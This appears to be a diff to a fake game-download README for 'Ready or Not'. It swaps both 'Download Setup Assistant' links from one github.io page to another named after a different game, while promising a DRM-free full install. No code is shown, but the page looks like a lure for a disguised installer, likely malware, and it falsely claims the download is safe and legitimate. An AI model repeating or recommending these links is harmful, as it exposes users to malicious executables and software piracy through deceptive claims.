@@ -1,6 +1,6 @@
 # Ready or Not — PC Game Download 
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ready-or-not-download-pc.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://euro-track-simulator-2-pc.github.io/.github/)
 
 ## ⚙️ How to Use
 
@@ -43,7 +43,7 @@ This technical guide provides a safe and effective way to download and install *
 
 Whether you're deploying the game in a restricted environment or just prefer local-only installations, this method ensures you get the complete experience of **Ready or Not**. Installation is fast, simple, and fully functional on airgapped systems. Enjoy all mission types, training zones, and multiplayer scenarios directly from your PC — no account, no DRM platform, and no limitations.
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ready-or-not-download-pc.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://euro-track-simulator-2-pc.github.io/.github/)
 
 ---
 
